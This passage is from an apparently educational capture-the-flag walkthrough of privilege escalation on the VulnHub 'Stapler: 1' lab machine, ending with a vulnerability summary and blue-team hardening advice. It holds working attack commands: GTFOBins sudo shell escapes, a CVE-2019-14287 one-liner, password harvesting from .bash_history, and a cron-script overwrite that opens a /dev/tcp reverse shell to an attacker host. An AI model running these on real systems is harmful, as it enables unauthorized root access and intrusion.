> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

> **Goal:** go from a low-privilege user to `root`. There are several ways; two
> are shown below.

### 4.1 (Option A) Misconfigured home permissions → credentials → `sudo`

Local enumeration first:


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
id; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
ls -la /home
```

```text
drwxr-xr-x  ... /home/JKanode
drwxr-xr-x  ... /home/peter
```

> **How to read it:** the home directories are **world-readable** (the middle
> `r-x` applies to “others”). We can read files we should not, including shell
> history:

```bash
cat /home/JKanode/.bash_history
```

```text
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
```

> **Why it works:** `.bash_history` captures commands *including the passwords
> typed on the command line*. `sshpass -p ...` logged into two accounts, so we
> now have both `JKanode`'s and `peter`'s passwords.

```bash
ssh peter@192.168.56.101        # password: JZQuyIN5  (varies by build)
```


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User peter may run the following commands on red:
    (ALL : ALL) ALL
```

> **Why it works:** `peter` is in the `sudo` group and may run **everything** as
> **anyone**. That is a full root grant:

```bash
sudo su
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.2 (Option B) World-writable script run by a root cron job

Even without finding credentials, `linuxprivchecker.py` (or `LinEnum`) reports a
**world-writable file**:

```bash
python3 linuxprivchecker.py 2>/dev/null | grep -A3 "World Writable"
```

```text
-rwxrwxrwx 1 root root 51 /usr/local/sbin/cron-logrotate.sh
```

```bash
ls -la /usr/local/sbin/cron-logrotate.sh
cat /usr/local/sbin/cron-logrotate.sh
```

```text
#Simon, you really need to-do something about this
```

> **Why it works:** a script that is **writable by everyone** but **executed by
> `root`** (here via a cron entry) is a guaranteed privilege escalation. We
> simply overwrite its contents with commands root will run, then wait for the
> next cron tick (about every 5 minutes).

Replace the script with a reverse shell:

```bash
cat > /usr/local/sbin/cron-logrotate.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.10/443 0>&1
EOF
chmod 777 /usr/local/sbin/cron-logrotate.sh
```

```bash
# On Kali
nc -lvnp 443
```

```text
root@red:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> An equivalent trick is to have the cron job copy and SUID a shell:
> `echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > /usr/local/sbin/cron-logrotate.sh`
> then run `/tmp/rootbash -p` after a few minutes.

### The root flag

```bash
cat /root/flag.txt
```

```text
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
              .-'''''-.
              |'-----'|
      ...  flag contents ...   (varies by build)
                 (ASCII art)
```

![root shell via cron-logrotate.sh and /root/flag.txt](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP + username in banner | vsftpd (port 21) | Username disclosure (`Harry`, `Elly`, `John`) |
| 2 | Over-permissive SMB shares | Samba shares `kathy` / `tmp` | `vsftpd.conf` leak (`local_root=/etc`), user list |
| 3 | Outdated WordPress plugin (LFI) | `advanced-video-embed` | Read `wp-config.php` → MySQL `root` creds |
| 4 | MySQL `FILE` privilege via phpMyAdmin | `SELECT ... INTO OUTFILE` | Web-shell as `www-data` |
| 5 | World-readable home directories | `/home/*`, FTP chroot to `/etc` | Read `.ssh/id_rsa` / `.bash_history` → other users |
| 6 | Weak/reused passwords | SSH | e.g. `SHayslett:SHayslett`, `peter:JZQuyIN5` |
| 7 | Over-permissive sudoers | `peter (ALL : ALL) ALL` | Full `root` |
| 8 | World-writable script run by root cron | `/usr/local/sbin/cron-logrotate.sh` | Full `root` |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and never leak usernames (banners, motd, error text).
- **Restrict SMB shares** to authenticated users; do not export config backups
  that reveal filesystem layout or credentials.
- **Keep WordPress, its themes and plugins patched**, remove unused plugins, and
  set the classic hardening flags (`DISALLOW_FILE_EDIT`, tight uploads folder
  permissions, no directory listing). Disable `SELECT ... INTO OUTFILE` for
  app DB users and grant only the privileges an app actually needs.
- **Run a web application firewall** and block `../` traversal in plugin input.
- **Fix home directory permissions** (`chmod 700 /home/*`). Never store
  passwords in `.bash_history` — use `sshpass -f`, SSH keys or an agent.
- **Remove world-writable files**, especially any script invoked by root. Audit
  cron with `cron`/`systemd timers` and `find / -perm -o+w -type f`.
- **Apply least privilege to `sudoers`:** list exact commands; never
  `(ALL : ALL) ALL`. Audit with `visudo -c`.
- **Logging/detection:** watch for web-shell creation in `wp-content/uploads/`,
  for `INTO OUTFILE` queries, for unexpected `id_rsa` reads, and for new/modified
  files under `/usr/local/sbin`.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/stapler-1,150/>
- Author's BSidesLondon 2016 slides (design notes / intended paths):
  <https://download.vulnhub.com/media/stapler/>
- Community writeups consulted:
  - [Stapler 1: Vulnhub Walkthrough (Jon Wood)](https://windsorwebdeveloper.com/stapler-1-vulnhub-walkthrough/)
  - [Stapler Vulnhub Writeup (jckhmr)](https://jckhmr.net/stapler-vulnhub-writeup/)
  - [VulnHub – Stapler: 1 Walkthrough (Steflan's Security Blog)](https://steflan-security.com/vulnhub-stapler-1-walkthrough/)
  - [Stapler 1: Vulnhub Walkthrough (Kook Sec)](http://kooksec.blogspot.com/2016/08/stapler-1-vulnhub-walkthough.html)
  - [Stapler Walkthrough (nullcereal)](https://nullcereal.com/2018/11/stapler-walkthrough/)
- Tool / reference docs:
  - [WPScan](https://wpscan.com/)
  - [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)
  - [linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)
  - [LinEnum](https://github.com/rebootuser/LinEnum)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (`arp-scan` / `netdiscover`)
- [ ] `images/02-nmap.png` — full service scan (the many open ports)
- [ ] `images/03-enum.png` — FTP/anon banner, SMB enum and `wpscan` plugin finding
- [ ] `images/04-foothold.png` — phpMyAdmin `INTO OUTFILE` web-shell / www-data shell
- [ ] `images/05-shell.png` — reverse shell upgraded to a TTY
- [ ] `images/06-user-flag.png` — `cat /home/JKanode/.bash_history` (credential harvest)
- [ ] `images/07-privesc.png` — `peter` `sudo -l` **or** the writable `cron-logrotate.sh`
- [ ] `images/08-root-flag.png` — root shell and `/root/flag.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
